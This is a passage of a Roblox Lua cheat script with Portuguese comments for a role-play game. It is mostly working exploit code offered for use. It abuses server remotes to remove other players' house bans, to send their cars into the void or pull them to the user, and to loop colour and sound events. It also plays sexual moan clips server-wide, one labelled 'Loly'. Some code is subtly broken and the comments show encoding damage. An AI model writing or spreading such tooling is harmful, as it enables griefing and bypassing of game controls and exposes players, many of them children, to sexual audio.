Tab4:AddButton({
    Name = "Equip",
    Description = "Equip Selected",
    Callback = function()
        if not _G.SelectedAvatar or _G.SelectedAvatar == "" then
            AvatarManager:MostrarNotificacao("No avatar selected!")
            return
        end
        AvatarManager:EquiparAvatar(_G.SelectedAvatar)
    end
})

-------------------------------------------------------------------------------------------------------------------------
local Section = Tab4:Section({ Title = "Accessories (Livraira)", Icon = "glasses" })
-- BotÃ£o para equipar partes do corpo

Tab4:AddParagraph({
    Title = "warning this will reset your avatar",
    Content = ""
})

-- Cria um botÃ£o para equipar todas as partes do corpo
Tab4:AddButton({
    Name = "Mini REPO",
    Callback = function()
        local args = {
            {
                117101023704825, -- Perna Direita
                125767940563838,  -- Perna Esquerda
                137301494386930,  -- BraÃ§o Direito
                87357384184710,  -- BraÃ§o Esquerdo
                133391239416999, -- Torso
                111818794467824   -- CabeÃ§a
            }
        }
        game:GetService("ReplicatedStorage")
            :WaitForChild("Remotes")
            :WaitForChild("ChangeCharacterBody")
            :InvokeServer(unpack(args))
        print("All body parts equipped!")
    end
})

---------------------------------------------------------------------------------------------------

Tab4:AddButton({
    Name = "Mini Stallion",
    Callback = function()
        local args = {
            {
                124355047456535, -- Perna Direita
                120507500641962,  -- Perna Esquerda
                82273782655463,  -- BraÃ§o Direito
                113625313757230,  -- BraÃ§o Esquerdo
                109182039511426, -- Torso
                0   -- CabeÃ§a
            }
        }
        game:GetService("ReplicatedStorage")
            :WaitForChild("Remotes")
            :WaitForChild("ChangeCharacterBody")
            :InvokeServer(unpack(args))
        print("All body parts equipped!")
    end
})

---------------------------------------------------------------------------------------------------

Tab4:AddButton({
    Name = "stick",
    Callback = function()
        local args = {
            {
                14731384498, -- Perna Direita
                14731377938,  -- Perna Esquerda
                14731377894,  -- BraÃ§o Direito
                14731377875,  -- BraÃ§o Esquerdo
                14731377941, -- Torso
                14731382899   -- CabeÃ§a
            }
        }
        game:GetService("ReplicatedStorage")
            :WaitForChild("Remotes")
            :WaitForChild("ChangeCharacterBody")
            :InvokeServer(unpack(args))
        print("All body parts equipped!")
    end
})

---------------------------------------------------------------------------------------------------

Tab4:AddButton({
    Name = "Chunky-Bug",
    Callback = function()
        local args = {
            {
                15527827600, -- Perna Direita
                15527827578,  -- Perna Esquerda
                15527831669,  -- BraÃ§o Direito
                15527836067,  -- BraÃ§o Esquerdo
                15527827184, -- Torso
                15527827599   -- CabeÃ§a
            }
        }
        game:GetService("ReplicatedStorage")
            :WaitForChild("Remotes")
            :WaitForChild("ChangeCharacterBody")
            :InvokeServer(unpack(args))
        print("All body parts equipped!")
    end
})

---------------------------------------------------------------------------------------------------

Tab4:AddButton({
    Name = "Cursed-Spider",
    Callback = function()
        local args = {
            {
                134555168634906, -- Perna Direita
                100269043793774,  -- Perna Esquerda
                125607053187319,  -- BraÃ§o Direito
                122504853343598,  -- BraÃ§o Esquerdo
                95907982259204, -- Torso
                91289185840375   -- CabeÃ§a
            }
        }
        game:GetService("ReplicatedStorage")
            :WaitForChild("Remotes")
            :WaitForChild("ChangeCharacterBody")
            :InvokeServer(unpack(args))
        print("All body parts equipped!")
    end
})

---------------------------------------------------------------------------------------------------

Tab4:AddButton({
    Name = "Possessed-Horror",
    Callback = function()
        local args = {
            {
                122800511983371, -- Perna Direita
                132465361516275,  -- Perna Esquerda
                125155800236527,  -- BraÃ§o Direito
                83070163355072,  -- BraÃ§o Esquerdo
                102906187256945, -- Torso
                78311422507297   -- CabeÃ§a
            }
        }
        game:GetService("ReplicatedStorage")
            :WaitForChild("Remotes")
            :WaitForChild("ChangeCharacterBody")
            :InvokeServer(unpack(args))
        print("All body parts equipped!")
    end
})

Tab4:AddParagraph({
    Title = "more items coming in the next update",
    Content = ""
})

---------------------------------------------------------------------------------------------------------------------------------
local Section = Tab5:Section({ Title = "House Control", Icon = "home" })


-- BotÃ£o para remover ban de todas as casas
Tab5:AddButton({
    Name = "Remove Ban from All Houses",
    Description = "Attempts to remove ban from all houses",
    Callback = function()
        local successCount = 0
        local failCount = 0
        for i = 1, 37 do
            local bannedBlockName = "BannedBlock" .. i
            local bannedBlock = Workspace:FindFirstChild(bannedBlockName, true)
            if bannedBlock then
                local success, _ = pcall(function()
                    bannedBlock:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        for _, house in pairs(Workspace:GetDescendants()) do
            if house.Name:match("BannedBlock") then
                local success, _ = pcall(function()
                    house:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        if successCount > 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Success",
                Text = "Bans removed from " .. successCount .. " houses!",
                Duration = 5
            })
        end
        if failCount > 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Warning",
                Text = "Failed to remove bans from " .. failCount .. " houses.",
                Duration = 5
            })
        end
        if successCount == 0 and failCount == 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Warning",
                Text = "No bans found to remove.",
                Duration = 5
            })
        end
    end
})

Tab5:AddParagraph({
    Title = "that's all lol",
    Content = ""
})



---------------------------------------------------------------------------------------------------------------------------------
                                          -- === Tab 5: Car === --
---------------------------------------------------------------------------------------------------------------------------------

local Section = Tab9:Section({ Title = "Anti bug (updated)", Icon = "shield" })


local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- Namespace para evitar conflitos
local TeleportCarro = {}
TeleportCarro.Players = Players
TeleportCarro.Workspace = Workspace
TeleportCarro.LocalPlayer = LocalPlayer
TeleportCarro.Camera = Camera

-- FunÃ§Ã£o para exibir notificaÃ§Ã£o
function TeleportCarro:MostrarNotificacao(mensagem)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Aviso",
            Text = mensagem,
            Duration = 5
        })
    end)
end

-- FunÃ§Ã£o para desativar/ativar dano de queda
function TeleportCarro:ToggleFallDamage(disable)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then return false end
    local humanoid = self.LocalPlayer.Character.Humanoid
    if disable then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid.PlatformStand = false
        return true
    else
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
        return false
    end
end

-- FunÃ§Ã£o para teleportar o jogador para o assento do carro
function TeleportCarro:TeleportToSeat(seat, car)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
        self:MostrarNotificacao("Personagem nÃ£o encontrado!")
        return false
    end
    local humanoid = self.LocalPlayer.Character.Humanoid
    local rootPart = self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        self:MostrarNotificacao("Parte raiz do personagem nÃ£o encontrada!")
        return false
    end

    humanoid.Sit = false
    task.wait(0.1)

    rootPart.CFrame = seat.CFrame + Vector3.new(0, 5, 0)
    task.wait(0.1)

    seat:Sit(humanoid)
    task.wait(0.5)
    return humanoid.SeatPart == seat
end

-- FunÃ§Ã£o para teleportar o carro para o void com delay
function TeleportCarro:TeleportToVoid(car)
    if not car then
        self:MostrarNotificacao("VeÃ­culo invÃ¡lido!")
        return
    end
    if not car.PrimaryPart then
        local body = car:FindFirstChild("Body", true) or car:FindFirstChild("Chassis", true)
        if body and body:IsA("BasePart") then
            car.PrimaryPart = body
        else
            self:MostrarNotificacao("Parte principal do veÃ­culo nÃ£o encontrada!")
            return
        end
    end
    local voidPosition = Vector3.new(0, -1000, 0)
    car:SetPrimaryPartCFrame(CFrame.new(voidPosition))
    task.wait(0.5)
end

-- FunÃ§Ã£o para teleportar o carro para a posiÃ§Ã£o do jogador com delay
function TeleportCarro:TeleportToPlayer(car, playerPos)
    if not car then
        self:MostrarNotificacao("VeÃ­culo invÃ¡lido!")
        return
    end
    if not car.PrimaryPart then
        local body = car:FindFirstChild("Body", true) or car:FindFirstChild("Chassis", true)
        if body and body:IsA("BasePart") then
            car.PrimaryPart = body
        else
            self:MostrarNotificacao("Parte principal do veÃ­culo nÃ£o encontrada!")
            return
        end
    end
    local targetPos = playerPos + Vector3.new(5, 0, 5)
    car:SetPrimaryPartCFrame(CFrame.new(targetPos))
    task.wait(0.5)
end

-- FunÃ§Ã£o para sair do carro e voltar Ã  posiÃ§Ã£o original
function TeleportCarro:ExitCarAndReturn(originalPos)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then return end
    local humanoid = self.LocalPlayer.Character.Humanoid
    if humanoid.SeatPart then
        humanoid.Sit = false
    end
    task.wait(0.1)
    if originalPos then
        self.LocalPlayer.Character:PivotTo(CFrame.new(originalPos))
    end
end

-- FunÃ§Ã£o para atualizar a lista de carros no dropdown
function TeleportCarro:AtualizarListaCarros()
    local pastaVeiculos = self.Workspace:FindFirstChild("Vehicles")
    local listaCarros = {}
    
    if pastaVeiculos then
        for _, carro in ipairs(pastaVeiculos:GetChildren()) do
            if carro.Name:match("Car$") then
                table.insert(listaCarros, carro.Name)
            end
        end
    end
    
    return listaCarros
end

-- ParÃ¡grafo
Tab6:AddParagraph({
    Title = "use void protection",
    Content = ""
})

-- Toggle para matar todos os carros
Tab6:AddToggle({
    Name = "Kill all cars in server",
    Description = "Teleports cars to the void",
    Default = false,
    Callback = function(state)
        local originalPosition
        local teleportActive = state
        local fallDamageDisabled = false

        if state then
            if self.LocalPlayer.Character and self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                originalPosition = self.LocalPlayer.Character.HumanoidRootPart.Position
            else
                TeleportCarro:MostrarNotificacao("Personagem nÃ£o encontrado!")
                return
            end

            fallDamageDisabled = TeleportCarro:ToggleFallDamage(true)

            spawn(function()
                local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
                if not vehiclesFolder then
                    TeleportCarro:MostrarNotificacao("Pasta de veÃ­culos nÃ£o encontrada!")
                    return
                end

                local cars = {}
                for _, car in ipairs(vehiclesFolder:GetChildren()) do
                    if car.Name:match("Car$") then
                        table.insert(cars, car)
                    end
                end

                for _, car in ipairs(cars) do
                    if not teleportActive then break end

                    local vehicleSeat = car:FindFirstChildWhichIsA("VehicleSeat", true)
                    if vehicleSeat and vehicleSeat.Occupant == nil then
                        local success = TeleportCarro:TeleportToSeat(vehicleSeat, car)
                        if success then
                            TeleportCarro:TeleportToVoid(car)
                            TeleportCarro:ExitCarAndReturn(originalPosition)
                            task.wait(1)
                        end
                    end
                end

                if teleportActive then
                    teleportActive = false
                    TeleportCarro:ToggleFallDamage(false)
                end
            end)
        else
            teleportActive = false
            TeleportCarro:ToggleFallDamage(false)
        end
    end
})

local Section = Tab6:Section({ Title = "Spawn Vehicles", Icon = "key" })

-- Criar o dropdown
local Dropdown = Tab6:AddDropdown({
    Name = "Select Player's Car",
    Description = "Select a player's car",
    Default = nil,
    Options = TeleportCarro:AtualizarListaCarros(),
    Callback = function(carroSelecionado)
        _G.SelectedVehicle = carroSelecionado
    end
})

-- Toggle para ver a cÃ¢mera do carro selecionado
Tab6:AddToggle({
    Name = "View Selected Car Camera",
    Description = "Focuses camera on selected car",
    Default = false,
    Callback = function(state)
        if state then
            if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
                TeleportCarro:MostrarNotificacao("No car selected!")
                return
            end

            local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
            if not vehiclesFolder then
                TeleportCarro:MostrarNotificacao("Vehicle folder not found!")
                return
            end

            local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
            if not vehicle then
                TeleportCarro:MostrarNotificacao("Selected car not found!")
                return
            end

            local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
            if not vehicleSeat then
                TeleportCarro:MostrarNotificacao("Vehicle seat not found!")
                return
            end

            -- Salvar o estado original da cÃ¢mera
            TeleportCarro.OriginalCameraSubject = TeleportCarro.Camera.CameraSubject
            TeleportCarro.OriginalCameraType = TeleportCarro.Camera.CameraType

            -- Ajustar a cÃ¢mera para o assento do carro, mesmo se ocupado
            TeleportCarro.Camera.CameraSubject = vehicleSeat
            TeleportCarro.Camera.CameraType = Enum.CameraType.Follow
            TeleportCarro:MostrarNotificacao("Camera set to car " .. _G.SelectedVehicle .. "!")
        else
            -- Restaurar a cÃ¢mera ao estado original
            if TeleportCarro.OriginalCameraSubject then
                TeleportCarro.Camera.CameraSubject = TeleportCarro.OriginalCameraSubject
                TeleportCarro.Camera.CameraType = TeleportCarro.OriginalCameraType or Enum.CameraType.Custom
                TeleportCarro:MostrarNotificacao("Camera restored to normal!")
                TeleportCarro.OriginalCameraSubject = nil
                TeleportCarro.OriginalCameraType = nil
            end
        end
    end
})

-- Atualizar o dropdown dinamicamente
TeleportCarro.Workspace:WaitForChild("Vehicles").ChildAdded:Connect(function()
    Dropdown:Set(TeleportCarro:AtualizarListaCarros())
end)
TeleportCarro.Workspace:WaitForChild("Vehicles").ChildRemoved:Connect(function()
    Dropdown:Set(TeleportCarro:AtualizarListaCarros())
end)

local Section = Tab6:AddSection({"Kill and Bring Functions"})

-- BotÃ£o para destruir carro selecionado
Tab6:AddButton({
    Name = "Destroy Selected Car",
    Description = "Teleports selected car to void",
    Callback = function()
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veÃ­culos nÃ£o encontrada!")
            return
        end

        local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
        if not vehicle then
            TeleportCarro:MostrarNotificacao("Carro selecionado nÃ£o encontrado!")
            return
        end

        local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
        if not vehicleSeat then
            TeleportCarro:MostrarNotificacao("Assento do carro nÃ£o encontrado!")
            return
        end

        if vehicleSeat.Occupant then
            TeleportCarro:MostrarNotificacao("Kill car failed, someone is in the driver's seat!")
            return
        end

        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador nÃ£o encontrado!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local success = TeleportCarro:TeleportToSeat(vehicleSeat, vehicle)
        if success then
            TeleportCarro:TeleportToVoid(vehicle)
            TeleportCarro:MostrarNotificacao("Car " .. _G.SelectedVehicle .. " was teleported to void!")
            TeleportCarro:ExitCarAndReturn(originalPos)
        else
            TeleportCarro:MostrarNotificacao("Failed to sit in car!")
        end
        TeleportCarro:ToggleFallDamage(false)
    end
})

-- BotÃ£o para trazer carro selecionado
Tab6:AddButton({
    Name = "Bring Selected Car",
    Description = "Teleports selected car to your position",
    Callback = function()
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veÃ­culos nÃ£o encontrada!")
            return
        end

        local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
        if not vehicle then
            TeleportCarro:MostrarNotificacao("Carro selecionado nÃ£o encontrado!")
            return
        end

        local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
        if not vehicleSeat then
            TeleportCarro:MostrarNotificacao("Assento do carro nÃ£o encontrado!")
            return
        end

        if vehicleSeat.Occupant then
            TeleportCarro:MostrarNotificacao("Car teleport failed, someone is in the driver's seat!")
            return
        end

        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador nÃ£o encontrado!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local success = TeleportCarro:TeleportToSeat(vehicleSeat, vehicle)
        if success then
            TeleportCarro:TeleportToPlayer(vehicle, originalPos)
            TeleportCarro:MostrarNotificacao("Car " .. _G.SelectedVehicle .. " teleported to you!")
            TeleportCarro:ExitCarAndReturn(originalPos)
        else
            TeleportCarro:MostrarNotificacao("Failed to sit in car!")
        end
        TeleportCarro:ToggleFallDamage(false)
    end
})

-- BotÃ£o para trazer todos os carros
Tab6:AddButton({
    Name = "Bring All Cars",
    Description = "Teleports all server cars to your position",
    Callback = function()
        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador nÃ£o encontrado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veÃ­culos nÃ£o encontrada!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local cars = {}
        for _, car in ipairs(vehiclesFolder:GetChildren()) do
            if car.Name:match("Car$") then
                table.insert(cars, car)
            end
        end

        for _, car in ipairs(cars) do
            local vehicleSeat = car:FindFirstChildWhichIsA("VehicleSeat", true)
            if vehicleSeat and vehicleSeat.Occupant == nil then
                local success = TeleportCarro:TeleportToSeat(vehicleSeat, car)
                if success then
                    TeleportCarro:TeleportToPlayer(car, originalPos)
                    TeleportCarro:ExitCarAndReturn(originalPos)
                    TeleportCarro:MostrarNotificacao("Car " .. car.Name .. " teleported to you!")
                    task.wait(1)
                else
                    TeleportCarro:MostrarNotificacao("Failed to sit in car " .. car.Name .. "!")
                end
            else
                if vehicleSeat then
                    TeleportCarro:MostrarNotificacao("Car " .. car.Name .. " ignored: someone is in the driver's seat!")
                else
                    TeleportCarro:MostrarNotificacao("Car " .. car.Name .. " ignored: seat not found!")
                end
            end
        end

        TeleportCarro:ToggleFallDamage(false)
        if #cars == 0 then
            TeleportCarro:MostrarNotificacao("No cars available to teleport!")
        end
    end
})

-- Manter o estado de dano de queda ao recarregar o personagem
local fallDamageDisabled = false
TeleportCarro.LocalPlayer.CharacterAdded:Connect(function(character)
    local humanoid = character:WaitForChild("Humanoid")
    if fallDamageDisabled then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid.PlatformStand = false
    else
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
    end
end)

---------------------------------------------------------------------------------------------------------------------------------
                                                   -- === Tab 6: RGB === --
---------------------------------------------------------------------------------------------------------------------------------

local Section = Tab10:Section({ Title = "Canoe", Icon = "anchor" })




-- Velocidade controlada pelo slider (quanto maior, mais rÃ¡pido)
local rgbSpeed = 1

Tab7:AddSlider({
    Name = "RGB Speed",
    Description = "Increases RGB effect speed",
    Min = 1,
    Max = 5,
    Increase = 1,
    Default = 3,
    Callback = function(Value)
        rgbSpeed = Value
    end
})

-- FunÃ§Ã£o para criar cor RGB suave com HSV
local function getRainbowColor(speedMultiplier)
    local h = (tick() * speedMultiplier % 5) / 5 -- gira o hue suavemente de 0 a 1
    return Color3.fromHSV(h, 1, 1)
end

-- FunÃ§Ã£o para disparar eventos
local function fireServer(eventName, args)
    local event = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
    if event and event:FindFirstChild(eventName) then
        pcall(function()
            event[eventName]:FireServer(unpack(args))
        end)
    end
end

local Section = Tab7:AddSection({"RGB to use on yourself"})

-- Nome + Bio RGB  juntos
local nameBioRGBActive = false
Tab7:AddToggle({
    Name = "Name + Bio RGB ",
    Default = false,
    Callback = function(state)
        nameBioRGBActive = state
        if state then
            task.spawn(function()
                while nameBioRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    fireServer("1RPNam1eColo1r", { "PickingRPNameColor", color })
                    fireServer("1RPNam1eColo1r", { "PickingRPBioColor", color })
                    task.wait(0.03)
                end
            end)
        end
    end
})

local ToggleCorpo = Tab7:AddToggle({
    Name = "Body RGB",
    Description = "RGB on body",
    Default = false
})
ToggleCorpo:Callback(function(Value)
    getgenv().rgbCorpo = Value
    task.spawn(function()
        while getgenv().rgbCorpo do
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
            if remote and remote:FindFirstChild("ChangeBodyColor") then
                pcall(function()
                    remote.ChangeBodyColor:FireServer({
                        BrickColor.new(getRainbowColor(rgbSpeed))
                    })
                end)
            end
            task.wait(0.1)
        end
    end)
end)



local ToggleCabelo = Tab7:AddToggle({
    Name = "Hair RGB",
    Description = "RGB on hair",
    Default = false
})
ToggleCabelo:Callback(function(Value)
    getgenv().rgbCabelo = Value
    task.spawn(function()
        while getgenv().rgbCabelo do
            fireServer("1Max1y", {
                "ChangeHairColor2",
                getRainbowColor(rgbSpeed)
            })
            task.wait(0.5)
        end
    end)
end)



local Section = Tab6:Section({ Title = "Vehicles", Icon = "truck" })



local ToggleCasa = Tab7:AddToggle({
    Name = "House RGB",
    Description = "RGB on house",
    Default = false
})
ToggleCasa:Callback(function(Value)
    getgenv().rgbCasa = Value
    task.spawn(function()
        while getgenv().rgbCasa do
            fireServer("1Player1sHous1e", {
                "ColorPickHouse",
                getRainbowColor(rgbSpeed)
            })
            task.wait(0.1)
        end
    end)
end)


-- Carro RGB 
local carRGBActive = false
Tab7:AddToggle({
    Name = "Car RGB (Premium)",
    Description = "Changes car color with continuous RGB. May cause kick if not premium!",
    Default = false,
    Callback = function(state)
        carRGBActive = state
        if state then
            task.spawn(function()
                while carRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    fireServer("1Player1sCa1r", { "PickingCarColor", color })
                    task.wait(0.03)
                end
            end)
        end
    end
})


local ToggleBicicleta = Tab7:AddToggle({
    Name = "Bicycle RGB",
    Description = "RGB on bicycle",
    Default = false
})
ToggleBicicleta:Callback(function(Value)
    getgenv().rgbBicicleta = Value
    task.spawn(function()
        while getgenv().rgbBicicleta do
            fireServer("1Player1sCa1r", {
                "NoMotorColor",
                getRainbowColor(rgbSpeed)
            })
            task.wait(0.1)
        end
    end)
end)



local Section = Tab7:AddSection({"items/tool"})


-- NOVO TOGGLE: RÃ¡dio RGB
local radioRGBActive = false
Tab7:AddToggle({
    Name = "Radio RGB  ",
    Description = "Changes radio color with continuous RGB",
    Default = false,
    Callback = function(state)
        radioRGBActive = state
        if state then
            task.spawn(function()
                while radioRGBActive and LocalPlayer.Character do
                    local color = getRainbowColor(rgbSpeed)
                    local success, remote = pcall(function()
                        return LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")
                    end)
                    if success and remote then
                        pcall(function()
                            remote:FireServer(color)
                        end)
                    end
                    task.wait(0.03)
                end
            end)
        end
    end
})

local ToggleMegafone = Tab7:AddToggle({
    Name = "Megaphone RGB",
    Description = "RGB on megaphone",
    Default = false
})
ToggleMegafone:Callback(function(Value)
    getgenv().rgbMegafone = Value
    task.spawn(function()
        while getgenv().rgbMegafone do
            local color = getRainbowColor(rgbSpeed)
            local gui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
            if gui then
                local btn = gui:FindFirstChild("ToolGui")
                if btn then
                    local settings = btn:FindFirstChild("ToolSettings")
                    if settings then
                        local props = settings:FindFirstChild("Settings"):FindFirstChild("PropsColor")
                        if props and props:FindFirstChild("SetColor") then
                            pcall(function()
                                props.SetColor:FireServer(color)
                            end)
                        end
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end)

---------------------------------------------------------------------------------------------------------------------------------
                                                -- === Tab 7: Music All === --
---------------------------------------------------------------------------------------------------------------------------------

local loopAtivo = false
local InputID = ""

Tab7:AddTextBox({
    Name = "Enter Audio ID All",
    Description = "Type sound ID you want to play",
    Default = "",
    PlaceholderText = "Exemplo: 6832470734",
    ClearTextOnFocus = true,
    Callback = function(text)
        InputID = tonumber(text)
    end
})

local function fireServer(eventName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local event = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild(eventName)
    if event then
        pcall(function()
            event:FireServer(unpack(args))
        end)
    end
end

Tab7:AddButton({
    Name = "Play Sound",
    Description = "Click to play inserted music",
    Callback = function()
        if InputID then
            fireServer("1Gu1nSound1s", {Workspace, InputID, 1})
            local globalSound = Instance.new("Sound", Workspace)
            globalSound.SoundId = "rbxassetid://" .. InputID
            globalSound.Looped = false
            globalSound:Play()
            task.wait(3)
            globalSound:Destroy()
        end
    end
})

Tab7:AddToggle({
    Name = "Loop",
    Description = "Enable to loop sound",
    Default = false,
    Callback = function(state)
        loopAtivo = state
        if loopAtivo then
            spawn(function()
                while loopAtivo do
                    if InputID then
                        fireServer("1Gu1nSound1s", {Workspace, InputID, 1})
                        local globalSound = Instance.new("Sound", Workspace)
                        globalSound.SoundId = "rbxassetid://" .. InputID
                        globalSound.Looped = false
                        globalSound:Play()
                        task.spawn(function()
                            task.wait(3)
                            globalSound:Destroy()
                        end)
                    end
                    task.wait(1)
                end
            end)
        end
    end
})

-- Dropdowns para Tab7
local function createSoundDropdown(title, musicOptions, defaultOption)
    local musicNames = {}
    local categoryMap = {}
    for category, sounds in pairs(musicOptions) do
        for _, music in ipairs(sounds) do
            if music.name ~= "" and music.id ~= "4354908569" then
                table.insert(musicNames, music.name)
                categoryMap[music.name] = {id = music.id, category = category}
            end
        end
    end

    local selectedSoundID = nil
    local currentVolume = 1
    local currentPitch = 1

    local function playSound(soundId, volume, pitch)
        fireServer("1Gu1nSound1s", {Workspace, soundId, volume})
        local globalSound = Instance.new("Sound")
        globalSound.Parent = Workspace
        globalSound.SoundId = "rbxassetid://" .. soundId
        globalSound.Volume = volume
        globalSound.Pitch = pitch
        globalSound.Looped = false
        globalSound:Play()
        task.spawn(function()
            task.wait(3)
            globalSound:Destroy()
        end)
    end

    Tab7:AddDropdown({
        Name = title,
        Description = "Choose a sound to play in the server",
        Default = defaultOption,
        Multi = false,
        Options = musicNames,
        Callback = function(selectedSound)
            if selectedSound and categoryMap[selectedSound] then
                selectedSoundID = categoryMap[selectedSound].id
            else
                selectedSoundID = nil
            end
        end
    })

    Tab7:AddButton({
        Name = "Play Selected Sound",
        Description = "Click to play sound from dropdown",
        Callback = function()
            if selectedSoundID then
                playSound(selectedSoundID, currentVolume, currentPitch)
            end
        end
    })

    local dropdownLoopActive = false
    Tab7:AddToggle({
        Name = "Loop",
        Description = "Activates loop for selected sound",
        Default = false,
        Callback = function(state)
            dropdownLoopActive = state
            if state then
                task.spawn(function()
                    while dropdownLoopActive do
                        if selectedSoundID then
                            playSound(selectedSoundID, currentVolume, currentPitch)
                        end
                        task.wait(1)
                    end
                end)
            end
        end
    })
end

-- Dropdown "Memes"
createSoundDropdown("Select a meme", {
    ["Memes"] = {
        {name = "pankapakan", id = "122547522269143"}, 
       
        {name = "Gemido ultra rÃ¡pido", id = "128863565301778"},
        {name = "vai g0z@?", id = "116293771329297"},
        {name = "G0z33iiii", id = "93462644278510"},
        {name = "Hommmm ", id = "133135656929513"},
        {name = "gemido1", id = "105263704862377"},
        {name = " gemido2", id = "92186909873950"},
        {name = "sus sex", id = "128137573022197"},
        {name = "gemido estranho", id = "131219411501419"},
        {name = "gemido kawai", id = "100409245129170"},
        {name = "Hentai wiaaaaan", id = "88332347208779"},
        {name = "iamete cunasai", id = "108494476595033"},
        {name = "dodichan onnn...", id = "134640594695384"},
        {name = "Loly gemiD0", id = "119277017538197"},
         {name = "ai poison", id = "115870718113313"},
         {name = "chegachega SUS", id = "77405864184828"},
         {name = "uwu", id = "76820720070248"},
         {name = "ai meu cuzin", id = "130714479795369"},
         {name = "girl audio 2", id = "84207358477461"},
        {name = "Hoo ze da manga", id = "106624090319571"},
        {name = "ai alexandre de moraes", id = "107261471941570"},
        {name = "haaii meme", id = "120006672159037"},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
        {name = "", id = ""},
 
    


        {name = "GoGogo gogogo", id = "103262503950995"},
        {name = "Toma jack", id = "132603645477541"},
        {name = "Toma jackV2", id = "100446887985203"},
        {name = "Toma jack no sol quente", id = "97476487963273"},
        {name = "ifood", id = "133843750864059"},
        {name = "pelo geito ela ta querendo ram", id = "94395705857835"},
        {name = "lula vai todo mundo", id = "136804576009416"},
        {name = "coringa", id = "84663543883498"},
        {name = "shoope", id = "8747441609"},
        {name = "quenojo", id = "103440368630269"},
        {name = "sai dai lava prato", id = "101232400175829"},
        {name = "se e loko numconpeÃ§a", id = "78442476709262"},
